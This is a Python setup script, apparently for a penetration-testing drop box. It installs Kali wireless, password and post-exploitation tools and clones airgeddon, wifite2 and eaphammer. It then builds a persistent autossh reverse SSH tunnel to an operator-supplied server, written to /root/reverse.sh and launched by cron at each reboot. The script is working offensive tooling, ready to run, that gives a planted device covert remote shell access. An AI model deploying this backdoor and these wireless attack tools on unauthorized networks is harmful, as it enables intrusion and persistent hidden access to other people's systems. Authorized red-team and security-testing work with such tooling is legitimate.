import subprocess
import os,sys

def internalwireless():
    #Install packages
    print("[*] Installing Dependencies and Packages!")
    print("\n")
    subprocess.call("apt update", shell=True)
    subprocess.call("apt upgrade -y", shell=True)
    subprocess.call("apt install kali-tools-802-11 kali-tools-database kali-tools-headless kali-tools-information-gathering kali-tools-passwords kali-tools-post-exploitation kali-tools-wireless -y", shell=True)
    subprocess.call("apt install autossh python3-pip bettercap ssh -y", shell=True)
    subprocess.call("systemctl enable ssh", shell=True)
    subprocess.call("systemctl start ssh", shell=True)
    subprocess.call("git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git", shell=True)
    subprocess.call("chmod +x airgeddon/airgeddon.sh", shell=True)
    subprocess.call("git clone https://github.com/derv82/wifite2.git", shell=True)
    subprocess.call("git clone https://github.com/s0lst1c3/eaphammer.git", shell=True)
    subprocess.call("./eaphammer/kali-setup", shell=True)

    print("\n")
    #Checking for SSH keys and generating them if they do not exist
    print("[*] Checking for Existing SSH Keys...")
    if os.path.isfile('/root/.ssh/id_rsa'):
        print("[*] SSH Keys Already Exist. ")
    else:
        print("[*] Generating SSH Keys for root")
        subprocess.call("ssh-keygen", shell=True)
    print("\n")

    #Set up reverse SSH with authssh
    print("[*] Setting Up Connection Information")
    print("[!] Note: In order to copy the SSH key to the Public Server, the User on the Public Server Needs to Have Password Authentication Enabled Over SSH.")
    print("\n")
    server = input("Server IP or URL: ")
    rev_port = input("Select Port on Public Server for Port Forwarding to On-Site Machine: ")

    #ssh-copy-id
    print("[*] Copying SSH Key to Remote Machine")
    copy_id = "ssh-copy-id -i /root/.ssh/id_rsa root@" + server
    subprocess.call(copy_id, shell=True)
    print("\n")

    #creating reverse SSH bash script
    print("[*] Creating Bash Script to Run on Boot")
    print("\n")
    if os.path.isfile('/root/reverse.sh'):
        print("[*] Bash Script Already Present")
    else:
        rev_ssh = '/usr/bin/autossh -f -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -R ' + rev_port + ':localhost:22 root@' + server
        f = open("/root/reverse.sh", "a")
        f.write("#!/bin/bash")
        f.write("\n\n")
        f.write(rev_ssh)
        f.close()
        subprocess.call("chmod +x /root/reverse.sh", shell=True)

    #Setting cronjob
    print("[*] Setting Connection to Launch on Boot Using Cron...")
    print("\n")
    if os.path.isfile("/root/cronjob"):
        print("[*] Cronjob File Present")
        print("Check crontab -l To See If Script Set To Run On @reboot")
    else:
        f2 = open("/root/cronjob", "w")
        f2.write("@reboot /bin/bash /root/reverse.sh\n\n")
        f2.close()
        subprocess.call("crontab /root/cronjob", shell=True)

    #test connection
    print("\n")
    cmd = "autossh -i /root/.ssh/id_rsa -R " + rev_port + ":localhost:22 root@" + server
    print("[*] Launching Connection Attempt.")
    print("[!] After Connection Initiates, Type netstat -lntp To Check That Port Forwarding Has Been Successful")
    print("[!] Type exit After Port Forward Check To Return to This Script.")
    print("\n")
    subprocess.call(cmd, shell=True)
    print("\n")
    print("\n")
    print("[*] Installation Complete")
    print("Please Reboot Machine to Check Connection Autolaunch on Boot")
